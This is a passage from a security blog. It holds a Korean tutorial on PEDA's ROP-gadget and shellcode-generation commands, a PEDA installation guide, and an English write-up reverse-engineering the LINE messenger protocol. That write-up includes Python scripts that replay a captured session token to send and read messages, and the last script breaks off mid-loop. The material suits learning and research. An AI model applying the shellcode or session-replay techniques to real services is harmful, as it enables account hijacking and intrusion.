<p>ropgadget 과 ropsearch 명령어는 ROP를 할 때 필요한 가젯들을 쉽게 찾을 수 있도록 도와주는 명령어입니다. ropgadget은 자주 쓰이는 가젯들인 pop-ret, leave-ret, add esp 와 같은 가젯들을 찾아줍니다. 또한 ropsearch는 원하는 특정 가젯을 찾을 수 있도록 도와줍니다. </p>
<p>dumprop도 비슷한 명령어인데, 이 명령어는 특정 가젯을 찾기 보다 특정 메모리 영역에서 모든 가젯들을 보고 싶을 때 유용합니다. 하지만 ropsearch ‘’ binary 이런 식으로 사용하면 ropsearch 로도 dumprop와 비슷하게 사용할 수 있습니다.</p>
<h3 id="How_to_use-10">How to use</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ ropgadget binary/libc/vdso/all ... ( 인자를 생략하면 ropgadget binary 와 같습니다. )</span><br><span class="line">gdb-peda$ ropsearch <span class="string">"gadget"</span> <span class="string">"범위"</span> ( gadget 부분을 <span class="string">''</span> 로 빈 상태로 보내면 모든 가젯을 찾습니다. )</span><br><span class="line">gdb-peda$ dumprop <span class="string">"범위"</span> ( 인자를 생략하면 dumprop binary 와 같습니다. )</span><br></pre></td></tr></table></figure>
<h3 id="Example-7">Example</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ ropgadget</span><br><span class="line">gdb-peda$ ropgadget libc</span><br><span class="line">gdb-peda$ ropsearch <span class="string">"add esp, ?"</span> binary</span><br><span class="line">gdb-peda$ ropsearch <span class="string">"int 0x80"</span> libc</span><br><span class="line">gdb-peda$ ropsearch <span class="string">""</span> binary ( binary 범위에서 모든 가젯을 찾습니다. )</span><br><span class="line">gdb-peda$ ropsearch <span class="string">"pop ?"</span> <span class="number">0</span>x08048000 <span class="number">0</span>x0804b000</span><br><span class="line">gdb-peda$ dumprop binary</span><br><span class="line">gdb-peda$ dumprop <span class="number">0</span>x08048000 <span class="number">0</span>x0804b000</span><br></pre></td></tr></table></figure>
<h2 id="jmpcall">jmpcall</h2><p align="center"> <img src="/img/peda-how-to13.png" style="width: 80%;"> </p>

<p>이 명령어도 ROP 할 때 유용한 가젯들을 찾아주는데, 그중 jmp와 call 가젯들을 전부 찾아줍니다. 그냥 jmpcall 만 입력하면 바이너리 영역 내의 모든 jmp, call 가젯들을 찾아주며 jmpcall esp libc 처럼 특정 메모리 영역 내의 특정 jmp, call 가젯들만 찾을 수도 있습니다.</p>
<h3 id="How_to_use-11">How to use</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ jmpcall <span class="string">"register"</span> <span class="string">"범위"</span> (인자들을 모두 생략하면 jmpcall <span class="string">""</span> binary 와 같으며, 바이너리 영영 내 모든 jmp, call 가젯들을 찾아줍니다.)</span><br></pre></td></tr></table></figure>
<h3 id="Example-8">Example</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ jmpcall</span><br><span class="line">gdb-peda$ jmpcall <span class="string">""</span> libc</span><br><span class="line">gdb-peda$ jmpcall esp libc</span><br><span class="line">gdb-peda$ jmpcall [eax] libc</span><br><span class="line">gdb-peda$ jmpcall eax ( jmpcall eax binary 와 같습니다. )</span><br></pre></td></tr></table></figure>
<h2 id="shellcode">shellcode</h2><p align="center"> <img src="/img/peda-how-to14.png" style="width: 80%;"> </p>

<p>PEDA에는 기본적으로 제공해주는 쉘코드가 몇 가지 있는데 shellcode generate 란 명령어로 현재 가능한 쉘코드 종류를 볼 수 있고, shellcode generate x86/linux exec 이런 식으로 지정하여 필요한 쉘코드를 바로바로 얻을 수도 있습니다.</p>
<p>현재 PEDA에 기본적으로 내장되어 있는 쉘코드는 x86/linux, bsd 뿐이지만 shellcode search나 display로 쉘코드를 웹에서 가져올 수도 있습니다.</p>
<h3 id="Example-9">Example</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ shellcode generate x86/linux <span class="built_in">exec</span></span><br></pre></td></tr></table></figure>
<p>이 외에도 PEDA는 많은 기능들을 제공하는데, PEDA에서 제공하는 다른 기능들도 살펴보시고 싶으시면, phelp 또는 peda help 를 입력하셔서 쭉 훑어보시면 됩니다.</p>
<p>PEDA 명령어나 명령어 활용법에 대해 다른 참고할만한 자료 및 사이트</p>
<ol>
<li><a href="http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf" target="_blank" rel="external">http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf</a></li>
<li><a href="http://security.cs.pub.ro/hexcellents/wiki/kb/toolset/peda" target="_blank" rel="external">http://security.cs.pub.ro/hexcellents/wiki/kb/toolset/peda</a></li>
</ol>
<p>수정할 내용이나 더 추가할 내용이 있다면 알려주세요!</p>
<p>작성자: <a href="https://github.com/L34p/" target="_blank" rel="external">l34p</a></p>
</span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2015/02/25/PEDA-Introduction-Installation/" itemprop="url">
                PEDA - Introduction && Installation
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          Posted on
          <time itemprop="dateCreated" datetime="2015-02-25T23:33:00+09:00" content="2015-02-25">
            2015-02-25
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
            &nbsp; | &nbsp;
            <a href="/2015/02/25/PEDA-Introduction-Installation/#comments" itemprop="discussionUrl">
              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/02/25/PEDA-Introduction-Installation/" itemprop="commentsCount"></span>
            </a>
          </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><h2 id="Introduction">Introduction</h2><p>PEDA는 Python Exploit Development Assistance for GDB 의 줄임말로 말 그대로 리눅스에서 디버깅할 때 흔히 사용하는 gdb에 exploit을 할때 도움이 되는  다양한 기능을 추가시켜주는 gdb python script 입니다.</p>
<p>밋밋한 gdb 만 쓰다 PEDA를 적용하여 사용해보시면 색도 알록달록하고 강력한 기능에 신세계를 경험하실 수 있을겁니다!</p>
<p>PEDA에 대한 자세한 내용은 아래의 URL에서 확인하실 수 있습니다.</p>
<ol>
<li><a href="https://github.com/longld/peda" target="_blank" rel="external">https://github.com/longld/peda</a></li>
<li><a href="http://ropshell.com/peda/" target="_blank" rel="external">http://ropshell.com/peda/</a></li>
</ol>
<h2 id="Installation">Installation</h2><p>설치 방법 및 적용 방법은 매우 간단합니다. (사실 ubuntu 최신 버전과 같이 gdb의 python 버전이 3.x 인 경우에는 쬐에에끔… 복잡할 수 있습니다.)</p>
<p>그래서 우선! 현재 설치하려고 하는 환경의 gdb가 어떤 버전의 python을 사용하고 있는지 확인해 보도록 하겠습니다.</p>
<p>gdb를 키고 python print(sys.version) 를 입력하여 python 버전을 확인합니다.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -q</span><br><span class="line">$ (gdb) python <span class="built_in">print</span>(sys.version)</span><br></pre></td></tr></table></figure>
<p>여기서 결과가 2.7.3 이런식으로 2 버전대로 나온다면 ,<br>PEDA파일을 받아오고 .gdbinit에 PEDA파일을 불러오는 내용만 추가해 주시면 됩니다.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
<p>저 두줄만 입력하여 주시면 PEDA 설치와 설정이 끝나게 됩니다.</p>
<p>하지만… 결과가 3.4.0 이런식으로 3 버전대로 나온다면, 위 두줄의 명령어를 실행하여 PEDA를 설치한 다음 gdb를 2버전대의 python으로 새로 컴파일 해주어야 합니다. 그 과정은 아래와 같습니다.</p>
<ol>
<li><p>현재 설치되어 있는 gdb를 지워줍니다.</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> <span class="built_in">remove</span> gdb</span><br></pre></td></tr></table></figure>
</li>
<li><p>gdb 소스를 받아옵니다.<br><a href="http://ftp.gnu.org/gnu/gdb/" target="_blank" rel="external">http://ftp.gnu.org/gnu/gdb/</a> 여기로 들어가셔서 gdb-7.8.2.tar.gz 를 받아주시면 됩니다.<br>( 2015년 2월 25일 현재 7.9버전까지 있으나 7.9버전에는 오류가 발생하여 잘 안되는것 같습니다. ) </p>
</li>
<li><p>다운로드 받은 gdb-7.8.2.tar.gz 의 압축을 풀어줍니다.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -xvf <span class="string">"다운로드 받은 경로"</span>/gdb-<span class="number">7.8</span>.<span class="number">2</span>.tar.gz</span><br></pre></td></tr></table></figure>
</li>
<li><p>python 2.7-dev 패키지 다운로드</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python2.<span class="number">7</span>-dev</span><br></pre></td></tr></table></figure>
</li>
<li><p>libncurses5-dev 패키지 다운로드</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libncurses5-dev</span><br></pre></td></tr></table></figure>
</li>
<li><p>압축해제한 gdb소스가 있는 경로로 이동하여 아래의 내용을 입력합니다.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure --with-python=python2</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p align="center"> <img src="/img/peda.png" style="width: 40%;"> </p>

<p>여기까지 따라오시느라 수고 많으셨습니다!<br>제대로 설치가 되었다면 아래와 같은 화면을 볼 수 있습니다.</p>
<p>작성자: <a href="https://github.com/L34p/" target="_blank" rel="external">l34p</a></p>
</span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2013/09/05/LINE-protocol-analysis/" itemprop="url">
                LINE(라인) protocol analysis
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          Posted on
          <time itemprop="dateCreated" datetime="2013-09-05T10:10:26+09:00" content="2013-09-05">
            2013-09-05
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
            &nbsp; | &nbsp;
            <a href="/2013/09/05/LINE-protocol-analysis/#comments" itemprop="discussionUrl">
              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2013/09/05/LINE-protocol-analysis/" itemprop="commentsCount"></span>
            </a>
          </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><h1 id="Let’s_send_a_message">Let’s send a message</h1><p><em>If you need a python code right away, then please keep in touch with <a href="https://github.com/carpedm20/LINE" target="_blank" rel="external">https://github.com/carpedm20/LINE</a></em></p>
<p>After I analyzed <a href="http://carpedm20.blogspot.kr/2013/08/python-wrapper-for-loco-protocol.html" target="_blank" rel="external">LOCO protocol</a> of KakaoTalk, I’ve been curious about the operation of other messaging applications. Like KakaoTalk, <a href="http://line.naver.jp/" target="_blank" rel="external">LINE</a> is the instant messaging application on smartphones and PCs. LINE is not popular in Korea, but media currently said that LINE is one of the most popular messaging app in Japan. So, I decided to analyze the protocol of LINE and I’ll record the steps that I followed in this post. My final goal is to implement the LINE protocol in python, especially sending and receiving messages.</p>
<p align="center"> <img src="/img/line1.jpg" style="width: 20%;"> </p>

<h2 id="1-_Download_xap_file">1. Download xap file</h2><p>First of all, I needed a xap file of LINE windows mobile application, so I searched it on Google.</p>
<p align="center"> <img src="/img/line2.png" style="width: 80%;"> </p>

<p>Finally, I found the old version of LINE xap file (version : 1.7.0.71). The latest version of windows LINE application is <a href="http://www.windowsphone.com/en-us/store/app/line/a18daaa9-9a1c-4064-91dd-794644cd88e7" target="_blank" rel="external">2.7.0.155</a>.</p>
<h2 id="2-_Unzip_xap_file">2. Unzip xap file</h2><p align="center"> <img src="/img/line3.png" style="width: 80%;"> </p>

<p>The first thing that attracted me was ‘Line.dll’ file and I guessed it may have core functions for the chat protocol. And also, I could see ‘Thrift.dll’ which is the library for <a href="http://thrift.apache.org/" target="_blank" rel="external">Thrift framework</a>. After I searched Google for a moment, I found that Thrift is an open source project for cross-language service built by <a href="http://apache.org/" target="_blank" rel="external">Apache</a>.</p>
<p>Now, I knew LINE uses Thrift library for network communication, which is not their own protocol, so I thought it might be easy to implement LINE chat system (compare to LOCO protocol).</p>
<h2 id="3-_Packet_Analysis">3. Packet Analysis</h2><p>Before I did the static analysis, I used <a href="https://www.microsoft.com/en-us/download/details.aspx?id=43719" target="_blank" rel="external">Windows mobile phone emulator</a> for the packet analysis. Of course, the network between application and server was encrypted using <code>https</code>. There were some packets which seem to be TCP protocol but I focused on the HTTP communication. After looked over the packet, I used <a href="http://www.red-gate.com/products/dotnet-development/reflector/" target="_blank" rel="external">.Net reflector</a> to see the real decompiled source code of applications.</p>
<p align="center"> <img src="/img/line4.png" style="width: 80%;"> </p>

<p>I searched <code>https</code> as a string, changed them to <code>http</code>, and re-zipped the <code>xap</code> file. At this point, I found out that the DNS of main server for chat communication was <code>gm.line.naver.jp</code>. Especially, <code>gm.line.naver.jp/S3</code> is used for authorization and chat service for LINE.</p>
<pre><code><span class="symbol">http:</span>/<span class="regexp">/gm.line.naver.jp/api</span><span class="regexp">/v3/</span><span class="constant">TalkService.</span><span class="keyword">do</span> <span class="keyword">for</span> talkSession
</code></pre><p>Then, I could see the plain chat communication between server and client in the packets.</p>
<p align="center"> <img src="/img/line5.png" style="width: 80%;"> </p>

<p>I’m not sure that HTTP is LINE’s main protocol, because LOCO protocol of KakaoTalk used their own packet structure which was encrypted with AES. As you can see, LINE doesn’t encrypt any messages, so I can see the <strong>plain message from packet</strong>. Also, <code>X-Line-Access</code>, which was included in the header, seems like a session key, so I was wonder whether the previous session can be used for communication or not. So I quickly wrote a dirty python code which send the exactly same packet to the server…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">'carpedm20'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://gm.line.naver.jp/S3'</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'POST'</span> : <span class="string">'/S3'</span>,</span><br><span class="line">        <span class="string">'X-Line-Application'</span> : <span class="string">'WINPHONE.1.7.0.71.WindowsPhone.7.10.7720'</span>,</span><br><span class="line">        <span class="string">'Referer'</span> : <span class="string">'file:///Applications/Install/???/Install/'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span> : <span class="string">'identity'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span> : <span class="string">'application/x-thrift'</span>,</span><br><span class="line">        <span class="string">'Accept'</span> : <span class="string">'application/x-thrift'</span>,</span><br><span class="line">        <span class="string">'X-Line-Access'</span> : <span class="string">'???'</span>,</span><br><span class="line">        <span class="string">'Connection'</span> : <span class="string">'Keep-Alive'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span> : <span class="string">'WindowsPhone 1.7.0.71'</span>,</span><br><span class="line">        <span class="string">'HOST'</span> : <span class="string">'gm.line.naver.jp'</span>,</span><br><span class="line">        <span class="string">'Cache-Control'</span> : <span class="string">'no-cache'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data=<span class="string">'\x80\x01\x00\x01\x00\x00\x00\x0b\x73\x65\x6e\x64\x4d\x65'</span> + \</span><br><span class="line">         <span class="string">'\x73\x73\x61\x67\x65\x00\x00\x00\x00\x08\x00\x01\x00\x00'</span> + \</span><br><span class="line">         <span class="string">'\x00\x00\x0c\x00\x02\x0b\x00\x02\x00\x00\x00\x21\x75\x30'</span> + \</span><br><span class="line">         <span class="string">'\x33\x39\x61\x31\x64\x39\x62\x33\x34\x35\x37\x61\x64\x39'</span> + \</span><br><span class="line">         <span class="string">'\x39\x35\x61\x66\x36\x36\x62\x34\x64\x64\x64\x30\x38\x30'</span> + \</span><br><span class="line">         <span class="string">'\x65\x36\x38\x0b\x00\x0a\x00\x00\x00\x06\x51\x77\x65\x71'</span> + \</span><br><span class="line">         <span class="string">'\x77\x65\x02\x00\x0e\x00\x00\x00'</span></span><br><span class="line"></span><br><span class="line">    request = urllib2.Request(url, data, headers)</span><br><span class="line">    response = urllib2.urlopen(request)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Result "</span></span><br><span class="line">    data = response.read()</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    <span class="comment">#data = json.loads(data ,encoding='utf-8')</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    send()</span><br></pre></td></tr></table></figure>
<p>It worked pretty well!</p>
<p align="center"> <img src="/img/line6.png" style="width: 90%;"> </p>


<h1 id="HTTP(S)_data">HTTP(S) data</h1><p>Now, I decide to analyze the LINE protocol in more detail.</p>
<h2 id="4-_HTTP(S)_Analysis">4. HTTP(S) Analysis</h2><p align="center"> <img src="/img/line7.png" style="width: 80%;"> </p>

<p>There are two particular headers, one is <code>X-Line-Application</code> and the other is <code>X-Line-Access</code>. The first header, <code>X-Line-Application</code>, specify the kind of mobile phone, which is not that interesting one ;(</p>
<p>However, the second header <code>X-Line-Access</code> seems like a session key and part of the key is encrypted by Base64. I’ll talk about this later. Anyway, after I decode the encrypted data, I can get <code>iat: 1378973334524</code> (string data) and <code>��&quot; [���&lt;Z� � 5wxwO�</code> (byte[] data)</p>
<p align="center"> <img src="/img/line8.png" style="width: 90%;"> </p>

<p>The format of POST data seems like ‘bson’ string which is used in LOCO protocol but it isn’t. To find out how the application deals with the session key and what kind of data type is used for POST data, I used .NET Reflector again and find out some interesting functions like <code>send_sendMessage(int seq, Message message)</code>.</p>
<p align="center"> <img src="/img/line9.png" style="width: 90%;"> </p>

<p>As you can see in this picture, there is a string <code>sendMessage</code> which also can be found in the POST data. Therefore, I guess that this <code>sendMessage</code> function makes the POST data. I also figure out that WriteMessageBegin() and WriteMessageEnd() are the functions for <strong>Thrift platform</strong>. I keep read some posts and decompiled codes to find out how Thrift works, but I can’t figure out the exact structure of Thrift HTTP protocol.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## VERSION of Thrift protocol ##</span></span><br><span class="line"><span class="comment"># TBinaryProtocol.VERSION_1 | type</span></span><br><span class="line">data = <span class="string">'\x80\x01\x00\x01'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Function ##</span></span><br><span class="line"><span class="comment"># \x00\x00\x00\x0b : sendMessage</span></span><br><span class="line"><span class="comment"># \x00\x00\x00\x0f : fetchOperations, for read message</span></span><br><span class="line">data += <span class="string">'\x00\x00\x00\x0b'</span> <span class="comment"># length of function</span></span><br><span class="line">data += <span class="string">'sendMessage'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Message information for static message ##</span></span><br><span class="line"><span class="comment">## (not include sticker information) ##</span></span><br><span class="line">data += <span class="string">'\x00\x00\x00\x00'</span></span><br><span class="line">data += <span class="string">'\x08\x00\x01\x00'</span></span><br><span class="line">data += <span class="string">'\x00\x00\x00\x0c'</span></span><br><span class="line">data += <span class="string">'\x00\x02\x0b\x00'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \x01\x00\x00\x00 : from</span></span><br><span class="line"><span class="comment"># \x02\x00\x00\x00 : to</span></span><br><span class="line">data += <span class="string">'\x02\x00\x00\x00'</span> <span class="comment"># to</span></span><br><span class="line">data += <span class="string">'????'</span> <span class="comment"># chat id to send message</span></span><br><span class="line">data += <span class="string">'\x0b\x00\x0a'</span> <span class="comment"># ChatId footer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## User input : not included in Thift protocol ##</span></span><br><span class="line">message = raw_input(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Length of message ##</span></span><br><span class="line"><span class="comment">#data += '\x00\x00\x00\x10' # \x06 : length</span></span><br><span class="line">data += struct.pack(<span class="string">'&gt;I'</span>,len(message))</span><br><span class="line"></span><br><span class="line"><span class="comment">## Message ##</span></span><br><span class="line"><span class="comment">#for i in range(16):</span></span><br><span class="line"><span class="comment">#    data += chr(49 + i) # 65 : A, 49 : 1</span></span><br><span class="line">data += message</span><br><span class="line"></span><br><span class="line"><span class="comment">## Message footer ##</span></span><br><span class="line"><span class="comment">#data += '\x0a\x02\x00\x0e\x00\x00\x00'</span></span><br><span class="line">data += <span class="string">'\x02\x00\x0e\x00\x00\x00'</span></span><br></pre></td></tr></table></figure>
<p>The bellow picture is the structure of Thrift packet based on the packet analysis that I took. (which may include some errors)</p>
<p align="center"> <img src="/img/line10.png" style="width: 50%;"> </p>

<p>And the bellow code is a short python code which can be used to send message to someone (not me).</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">'carpedm20'</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://gm.line.naver.jp/S3'</span></span><br><span class="line">headers = &#123; <span class="string">'POST'</span> : <span class="string">'/S3'</span>,</span><br><span class="line">    <span class="string">'X-Line-Application'</span> : <span class="string">'WINPHONE.1.7.0.71.WindowsPhone.7.10.7720'</span>,</span><br><span class="line">    <span class="string">'Referer'</span> : <span class="string">'file:///Applications/Install/A18DAAA9-9A1C-4064-91DD-794644CD88E7/Install/'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span> : <span class="string">'identity'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span> : <span class="string">'application/x-thrift'</span>,</span><br><span class="line">    <span class="string">'Accept'</span> : <span class="string">'application/x-thrift'</span>,</span><br><span class="line">    <span class="string">'X-Line-Access'</span> : <span class="string">'????'</span>;</span><br><span class="line">    <span class="string">'Connection'</span> : <span class="string">'Keep-Alive'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span> : <span class="string">'WindowsPhone 1.7.0.71'</span>,</span><br><span class="line">    <span class="string">'HOST'</span> : <span class="string">'gm.line.naver.jp'</span>,</span><br><span class="line">    <span class="string">'Cache-Control'</span> : <span class="string">'no-cache'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">()</span>:</span></span><br><span class="line">    data = <span class="string">'\x80\x01\x00\x01\x00\x00\x00\x0b'</span></span><br><span class="line">    data += <span class="string">'sendMessage'</span></span><br><span class="line">    data += <span class="string">'\x00\x00\x00\x00\x08\x00\x01\x00\x00\x00\x00\x0c\x00\x02\x0b\x00\x02\x00\x00\x00'</span></span><br><span class="line">    data += <span class="string">'????'</span> <span class="comment"># chat id to send message</span></span><br><span class="line">    data += <span class="string">'\x0b\x00\x0a'</span></span><br><span class="line">    message = raw_input(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    data += struct.pack(<span class="string">'&gt;I'</span>,len(message))</span><br><span class="line">    data += message</span><br><span class="line">    data += <span class="string">'\x02\x00\x0e\x00\x00\x00'</span></span><br><span class="line"></span><br><span class="line">    request = urllib2.Request(url, data, headers)</span><br><span class="line">    response = urllib2.urlopen(request)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Result "</span></span><br><span class="line"></span><br><span class="line">    data = response.read()</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"%#x"</span> % ord(d),</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span></span><br><span class="line">    data = <span class="string">'\x80\x01\x00\x01'</span> <span class="comment"># TBinaryProtocol.VERSION_1 | type</span></span><br><span class="line">    data += <span class="string">'\x00\x00\x00\x0f'</span></span><br><span class="line"></span><br><span class="line">    data += <span class="string">'fetchOperations'</span></span><br><span class="line">    data += <span class="string">'\x00\x00\x00\x00\x0a'</span></span><br><span class="line">    data += <span class="string">'\x00\x02\x00\x00\x00\x00\x00\x00\x00\xf9\x08\x00\x03\x00\x00\x00\x14\x00'</span></span><br><span class="line"></span><br><span class="line">    request = urllib2.Request(url, data, headers)</span><br><span class="line">    response = urllib2.urlopen(request)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Result "</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    data = response.read()</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"%#x"</span> % ord(d),</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    